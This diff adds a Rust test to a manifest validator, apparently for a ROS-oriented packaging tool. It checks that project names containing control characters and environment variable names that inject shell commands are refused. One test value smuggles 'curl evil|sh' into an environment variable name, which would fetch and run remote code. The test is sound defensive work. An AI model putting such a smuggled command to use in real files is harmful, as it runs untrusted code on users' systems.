@@ -443,3 +443,18 @@ fn apt_names_that_look_like_options_are_refused() {
     assert!(errs[0].contains("manifest.apt_name_invalid") && errs[0].contains("dependencies.apt"));
     assert!(errs[1].contains("target.linux-x86_64.replace") && errs[1].contains("--force-yes"));
 }
+
+#[test]
+fn env_names_and_project_names_that_inject_shell_are_refused() {
+    let text = MINIMAL
+        .replace("name = \"minimal\"", "name = \"a\\nb\"")
+        .replace(
+            "ROS_DOMAIN_ID = \"0\"",
+            "ROS_DOMAIN_ID = \"0\"\n\"X;curl evil|sh;Y\" = \"1\"\n_OK1 = \"2\"\n1BAD = \"3\"",
+        );
+    let errs = validation_errors(&text);
+    assert_eq!(errs.len(), 3, "{errs:?}");
+    assert!(errs[0].contains("manifest.name_control_chars"));
+    assert!(errs[1].contains("manifest.env_name_invalid") && errs[1].contains("X;curl"));
+    assert!(errs[2].contains("1BAD"));
+}
